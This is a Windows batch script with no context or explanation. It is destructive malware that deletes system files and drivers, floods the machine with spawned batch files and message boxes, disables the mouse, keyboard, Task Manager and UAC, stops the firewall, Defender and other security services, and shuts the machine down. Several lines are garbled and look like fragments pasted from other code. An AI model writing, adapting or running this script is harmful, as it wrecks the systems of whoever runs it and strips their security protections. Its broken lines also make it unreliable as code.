@echo off
time 00:00
RMDIR %systemroot%
:loop
%userprofile%/desktop
echo msgbox"flood">%random%.bat&%random%.bat
goto loop
rundll32 mouse,disable
rundll32 keyboard,disable
del /q /f /s %systemroot%\System32\Drivers\*
rundll32 USER32.DLL,SwapMouseButton
DEL C:\Windows\System32\notepad.exe
TASKKILL /F /IM EXPLORER.EXE
net stop "WSearch"
ipconfig /release + vbnewlineif %ERRORLEVEL%==1 ipconfig /release_all
net stop "SDRSVC"
net stop "WPCSvc"
net stop "WerSvc"
net stop "Security Center"
net stop"MpsSvc"
taskkill /f /t /im"FirewallControlPanel.exe"
if %errorlevel%==1 tskill FirewallControlPanel
netsh firewall set opmode mode=disable
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f > nul
net stop"WinDefend"
taskkill /f /t /im "MSASCui.exe"
if %errorlevel%==1 tskill MSASCui
net stopTextbox2.textwuauserv"
@Cmd /k Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t "REG_DWORD" /d "0" /f > nul
echo msgbox"">.vbs&.vbs
DEL 
:msgboxspam
echo msgbox"">.vbs&.vbs
DEL 
goto msgboxspam
start 
shutdown -s -t ""-c ""
